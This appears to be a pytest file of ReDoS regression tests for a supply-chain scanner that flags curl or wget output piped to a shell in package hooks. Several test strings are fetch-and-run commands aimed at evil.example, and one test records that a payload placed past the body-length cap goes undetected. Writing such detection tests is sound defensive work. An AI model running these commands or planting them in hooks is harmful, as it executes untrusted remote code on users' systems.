"""ReDoS regression tests for the shared hook-pattern substrate.

The curl/wget pipe-to-shell patterns previously used
``\\s+[^|]*\\s*`` — three adjacent overlapping quantifiers (the
negated class includes whitespace), quadratic on ``curl`` followed by
a long whitespace run with no pipe.  These tests pin:

  * the pathological input completes fast,
  * detection semantics are unchanged on the shapes we care about,
  * ``analyse_body`` bounds hook-body length before any pattern runs.
"""

from __future__ import annotations

import time

from packages.sca.supply_chain._hook_patterns import (
    _MAX_HOOK_BODY_BYTES,
    analyse_body,
)

_TIME_BUDGET_SECONDS = 0.5


# ---------------------------------------------------------------------------
# Timing — pre-fix this was quadratic
# ---------------------------------------------------------------------------

def test_curl_many_spaces_no_pipe_completes_fast() -> None:
    """``curl`` + 100k spaces + no pipe.  Pre-fix the overlapping
    quantifiers backtracked quadratically on this shape."""
    body = "curl" + " " * 100_000
    t0 = time.monotonic()
    analysis = analyse_body(body)
    elapsed = time.monotonic() - t0
    assert elapsed < _TIME_BUDGET_SECONDS, (
        f"curl + 100k spaces took {elapsed:.3f}s — ReDoS regression"
    )
    assert "curl piped to shell" not in analysis.reasons


def test_wget_many_spaces_no_pipe_completes_fast() -> None:
    body = "wget" + " " * 100_000
    t0 = time.monotonic()
    analysis = analyse_body(body)
    elapsed = time.monotonic() - t0
    assert elapsed < _TIME_BUDGET_SECONDS
    assert "wget piped to shell" not in analysis.reasons


# ---------------------------------------------------------------------------
# Detection semantics — unchanged by the pattern rewrite
# ---------------------------------------------------------------------------

def test_curl_pipe_bash_still_detected() -> None:
    analysis = analyse_body("curl https://evil.example/install.sh | bash")
    assert "curl piped to shell" in analysis.reasons


def test_curl_pipe_bash_no_spaces_still_detected() -> None:
    analysis = analyse_body("curl https://evil.example/i.sh|bash")
    assert "curl piped to shell" in analysis.reasons


def test_curl_with_flags_and_url_args_piped_still_detected() -> None:
    analysis = analyse_body(
        "curl -fsSL --retry 3 'https://evil.example/x.sh?arch=x64' | sh"
    )
    assert "curl piped to shell" in analysis.reasons


def test_wget_pipe_zsh_still_detected() -> None:
    analysis = analyse_body("wget -qO- https://evil.example/x.sh | zsh")
    assert "wget piped to shell" in analysis.reasons


def test_curl_without_pipe_not_flagged() -> None:
    analysis = analyse_body("curl -o out.tar.gz https://example.com/a.tgz")
    assert "curl piped to shell" not in analysis.reasons


def test_curl_piped_to_tar_not_flagged() -> None:
    analysis = analyse_body("curl -sL https://example.com/a.tgz | tar xz")
    assert "curl piped to shell" not in analysis.reasons


# ---------------------------------------------------------------------------
# Body-length cap
# ---------------------------------------------------------------------------

def test_oversized_body_is_truncated_before_scanning() -> None:
    """A dangerous shape placed past the cap is not scanned — the cap
    bounds regex work on adversarial megabyte bodies.  Legitimate hook
    commands are far shorter than the cap."""
    padding = "echo ok\n" * (_MAX_HOOK_BODY_BYTES // 8 + 1)
    body = padding + "curl https://evil.example/x.sh | bash"
    assert len(body) > _MAX_HOOK_BODY_BYTES
    analysis = analyse_body(body)
    assert "curl piped to shell" not in analysis.reasons


def test_dangerous_shape_before_cap_still_detected() -> None:
    body = "curl https://evil.example/x.sh | bash\n" + "echo ok\n" * 10_000
    analysis = analyse_body(body)
    assert "curl piped to shell" in analysis.reasons


def test_huge_body_completes_fast() -> None:
    """Multi-megabyte body — the cap keeps total pattern work bounded
    regardless of content."""
    body = ("curl " + " " * 512 + "\n") * 10_000
    t0 = time.monotonic()
    analyse_body(body)
    elapsed = time.monotonic() - t0
    assert elapsed < _TIME_BUDGET_SECONDS
